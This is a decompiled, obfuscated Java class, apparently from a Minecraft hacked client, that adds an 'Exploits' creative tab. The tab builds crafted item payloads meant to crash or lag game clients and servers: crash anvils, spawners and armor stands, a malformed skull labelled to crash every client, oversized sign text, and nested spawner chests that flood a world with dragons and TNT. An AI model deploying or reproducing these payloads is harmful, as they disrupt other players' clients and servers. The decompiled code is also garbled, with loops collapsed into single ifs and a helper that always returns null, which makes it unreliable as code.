package awsl;

import java.awt.Color;
import java.util.List;
import java.util.regex.Pattern;
import net.minecraft.creativetab.CreativeTabs;
import net.minecraft.init.Blocks;
import net.minecraft.init.Items;
import net.minecraft.item.Item;
import net.minecraft.item.ItemStack;
import net.minecraft.nbt.NBTTagCompound;
import net.minecraft.nbt.NBTTagList;
import net.minecraft.util.ResourceLocation;
import obfuscate.a;

public class Class712 extends CreativeTabs {
   private ItemStack Field3077;

   public Class712() {
      super(creativeTabArray.length, "Exploits");
      StringBuilder var1 = new StringBuilder();
      int var2 = 1;
      int var3 = 0;

      for(short var4 = 10000; var3 <= var4; ++var3) {
         ++var2;
         if (var2 >= 4) {
            var2 = 0;
         }

         var1.append(var3 + ":{Type:" + var2 + "b,Trail:1b,Colors:[" + Method2055(var3 * 300) + ",],FadeColors:[" + Method2055(var3 * 300) + ",]},");
      }

      var1.append(var3 + ":{Type:0b,Trail:1b,Colors:[1850598,],FadeColors:[8530835,]}");
      this.Field3077 = Method1997("fireworks 1 0 {HideFlags:63,display:{Name:\"§cRandom §a§lFirework\"},Fireworks:{Explosions:[" + var1 + "]}}");
   }

   public void Method1975(List a) {
      super.Method1975(a);
      ItemStack var3 = new ItemStack(Items.potionitem);
      var3.setItemDamage(16384);
      NBTTagList var4 = new NBTTagList();
      Class728.Method2000();
      int var5 = 1;
      byte var6 = 23;
      if (var5 <= var6) {
         NBTTagCompound var7 = new NBTTagCompound();
         var7.setInteger("Amplifier", Integer.MAX_VALUE);
         var7.setInteger("Duration", Integer.MAX_VALUE);
         var7.setInteger("Id", var5);
         var4.appendTag(var7);
         ++var5;
         a.trash(new String[2]);
      }

      var3.setTagInfo("CustomPotionEffects", var4);
      var3.setStackDisplayName("§c§lTroll§6§lPotion");
      a.Method2530(var3);
      ItemStack var19 = new ItemStack(Items.potionitem);
      var19.setItemDamage(16384);
      NBTTagList var20 = new NBTTagList();
      int var8 = 1;
      byte var9 = 23;
      NBTTagCompound var10;
      if (var8 <= var9) {
         var10 = new NBTTagCompound();
         var10.setInteger("Amplifier", 127);
         var10.setInteger("Duration", Integer.MAX_VALUE);
         var10.setInteger("Id", var8);
         var20.appendTag(var10);
         ++var8;
      }

      var19.setTagInfo("CustomPotionEffects", var20);
      var19.setStackDisplayName("§c§lTroll§6§lPotion");
      a.Method2530(var19);
      ItemStack var21 = new ItemStack(Items.potionitem);
      var21.setItemDamage(16395);
      var10 = new NBTTagCompound();
      var10.setInteger("Amplifier", 125);
      var10.setInteger("Duration", 1);
      var10.setInteger("Id", 6);
      NBTTagList var11 = new NBTTagList();
      var11.appendTag(var10);
      var21.setTagInfo("CustomPotionEffects", var11);
      var21.setStackDisplayName("§c§lKill§6§lPotion");
      a.Method2530(var21);
      ItemStack var12 = new ItemStack(Items.potionitem);
      var12.setItemDamage(16451);
      NBTTagList var13 = new NBTTagList();
      int[] var14 = new int[]{5, 10, 11};
      int var15 = 0;
      if (var15 < 3) {
         NBTTagCompound var16 = new NBTTagCompound();
         var16.setInteger("Amplifier", 127);
         var16.setInteger("Duration", Integer.MAX_VALUE);
         var16.setInteger("Id", var14[var15]);
         var13.appendTag(var16);
         ++var15;
      }

      var12.setTagInfo("CustomPotionEffects", var13);
      var12.setStackDisplayName("§c§lGod§6§lPotion");
      a.Method2530(var12);
      ItemStack var22 = new ItemStack(Blocks.anvil);
      var22.setStackDisplayName("§8Crash§c§lAnvil §7| §cmc1.8-mc1.8");
      var22.setItemDamage(16384);
      a.Method2530(var22);
      a.Method2530(Method1997("furnace 1 0 {BlockEntityTag:{Items:[0:{Slot:0,id:\"skull\",Count:64,tag:{SkullOwner:{Id:\"0\"}}}]},display:{Lore:[0:\"§bCrash(Every Client)\"]}}"));
      a.Method2530(Method1997("mob_spawner 1 0 {BlockEntityTag:{EntityId:\"Painting\"}}").setStackDisplayName("§8Crash§c§lSpawner §7| §cmc1.8-mc1.8"));
      a.Method2530(Method1997("armor_stand 1 0 {EntityTag:{Equipment:[{},{},{},{},{id:\"skull\",Count:1b,Damage:3b,tag:{SkullOwner:\"Test\"}}]}}").setStackDisplayName("§8Crash§2§lStand §7| §cmc1.10"));
      StringBuilder var23 = new StringBuilder();
      int var17 = 0;
      short var18 = 499;
      if (var17 <= var18) {
         var23.append("/(!§()%/§)=/(!§()%/§)=/(!§()%/§)=");
         ++var17;
      }

      a.Method2530(Method1997("sign 1 0 {BlockEntityTag:{Text1:\"{\\\"text\\\":\\\"" + var23 + "\\\"}\",Text2:\"{\\\"text\\\":\\\"" + var23 + "\\\"}\",Text3:\"{\\\"text\\\":\\\"" + var23 + "\\\"}\",Text4:\"{\\\"text\\\":\\\"" + var23 + "\\\"}\"}}").setStackDisplayName("§8Lag§2§lSign §7| §cmc1.8"));
      a.Method2530(Method1997("spawn_egg 1 64"));
      a.Method2530(Method1997("spawn_egg 1 63"));
      a.Method2530(Method1997("spawn_egg 1 53"));
      a.Method2530(Method1997("name_tag 1 0 {display:{Name: \"" + var23 + "\"}}"));
      a.Method2530(Method1997("fireworks 1 0 {HideFlags:63,Fireworks:{Flight:127b,Explosions:[0:{Type:0b,Trail:1b,Colors:[16777215,],Flicker:1b,FadeColors:[0,]}]}}").setStackDisplayName("§cInfinity §a§lFirework"));
      a.Method2530(this.Field3077);
      a.Method2530(Method1997("chest 1 0 {BlockEntityTag:{Items:[0:{Slot:0b, id:\"minecraft:mob_spawner\",Count:64b,tag:{display:{Lore:[0:\"§a随机生成100个末影龙刷怪笼!!\",10:\"§cBy CCBLUEX\"],Name:\"§c§lEnder§c§a§lDragon §bSpawner\"},BlockEntityTag:{EntityId:\"FallingSand\",MaxNearbyEntities:1000,RequiredPlayerRange:100,SpawnCount:100,SpawnData:{Motion:[0:0.0d,1:0.0d,2:0.0d],Block:\"mob_spawner\",Time:1,Data:0,TileEntityData:{EntityId:\"FallingSand\",MaxNearbyEntities:1000,RequiredPlayerRange:100,SpawnCount:100,SpawnData:{Motion:[0:0.0d,1:0.0d,2:0.0d],Block:\"mob_spawner\",Time:1,Data:0,TileEntityData:{EntityId:\"EnderDragon\",MaxNearbyEntities:1000,RequiredPlayerRange:100,SpawnCount:100,MaxSpawnDelay:20,SpawnRange:100,MinSpawnDelay:20},DropItem:0},MaxSpawnDelay:20,SpawnRange:500,MinSpawnDelay:20},DropItem:0},MaxSpawnDelay:5,SpawnRange:500,Delay:20,MinSpawnDelay:5}},Damage:0s},1:{Slot:1b, id:\"minecraft:mob_spawner\",Count:64b,tag:{display:{Lore:[0:\"§a生成无数个TNT向天上发射!!\",10:\"§cBy SuChen\"],Name:\"§bFLY §6TNT\"},BlockEntityTag:{EntityId:\"FallingSand\",MaxNearbyEntities:1000,RequiredPlayerRange:100,SpawnCount:100,SpawnData:{Motion:[0:0.0d,1:0.0d,2:0.0d],Block:\"mob_spawner\",Time:1,Data:0,TileEntityData:{EntityId:\"FallingSand\",MaxNearbyEntities:1000,RequiredPlayerRange:100,SpawnCount:100,SpawnData:{Motion:[0:0.0d,1:0.0d,2:0.0d],Block:\"mob_spawner\",Time:1,Data:0,TileEntityData:{EntityId:\"PrimedTnt\",MaxNearbyEntities:1000,RequiredPlayerRange:100,SpawnCount:100,MaxSpawnDelay:20,SpawnRange:100,MinSpawnDelay:20,SpawnData:{Motion:[0.0,5.0,0.0],Fuse:20}},DropItem:0},MaxSpawnDelay:20,SpawnRange:500,MinSpawnDelay:20},DropItem:0},MaxSpawnDelay:5,SpawnRange:500,Delay:20,MinSpawnDelay:5}},Damage:0s},2:{Slot:2b, id:\"minecraft:mob_spawner\",Count:64b,tag:{display:{Lore:[0:\"§a生成N个TNT原地爆炸!!\",10:\"§cBy SuChen\"],Name:\"§bBoom!!! §6TNT\"},BlockEntityTag:{EntityId:\"FallingSand\",MaxNearbyEntities:1000,RequiredPlayerRange:100,SpawnCount:100,SpawnData:{Motion:[0:0.0d,1:0.0d,2:0.0d],Block:\"mob_spawner\",Time:1,Data:0,TileEntityData:{EntityId:\"FallingSand\",MaxNearbyEntities:1000,RequiredPlayerRange:100,SpawnCount:100,SpawnData:{Motion:[0:0.0d,1:0.0d,2:0.0d],Block:\"mob_spawner\",Time:1,Data:0,TileEntityData:{EntityId:\"PrimedTnt\",MaxNearbyEntities:1000,RequiredPlayerRange:100,SpawnCount:100,MaxSpawnDelay:20,SpawnRange:100,MinSpawnDelay:20,SpawnData:{Motion:[0.0,0.0,0.0],Fuse:500}},DropItem:0},MaxSpawnDelay:20,SpawnRange:500,MinSpawnDelay:20},DropItem:0},MaxSpawnDelay:5,SpawnRange:500,Delay:20,MinSpawnDelay:5}},Damage:0s},3:{Slot:3b, id:\"minecraft:name_tag\",Count:64b,tag:{display:{Lore:[\"§cBy_SuChen\"],Name:\"§bGood§6Game\"}}}],value:\"Chest\",Lock:\"\"}}").setStackDisplayName("§c§lBad §c§a§lBoy §bSpawner Chest"));
   }

   public Item Method1976() {
      return (new ItemStack(Items.potionitem)).getItem();
   }

   public String Method1977() {
      return "Exploits";
   }

   public boolean Method1978() {
      return false;
   }

   public static int Method2055(int a) {
      double var1 = Math.ceil((double)(System.currentTimeMillis() + (long)a) / 4.0);
      return Color.getHSBColor((float)((var1 %= 360.0) / 360.0), 0.6F, 1.0F).getRGB();
   }

   public static ItemStack Method1997(String a) {
      try {
         a = a.replace('&', '§');
         Item var1 = new Item();
         String[] var3 = null;
         boolean var4 = true;
         boolean var5 = false;
         byte var6 = 0;
         if (var6 <= Math.min(12, a.length() - 2)) {
            var3 = a.substring(var6).split(Pattern.quote(" "));
            ResourceLocation var7 = new ResourceLocation(var3[0]);
            var1 = (Item)Item.itemRegistry.getObject(var7);
         }

         return null;
      } catch (Exception var9) {
         var9.printStackTrace();
         return null;
      }
   }

   private static Exception Method2001(Exception exception) {
      return exception;
   }
}
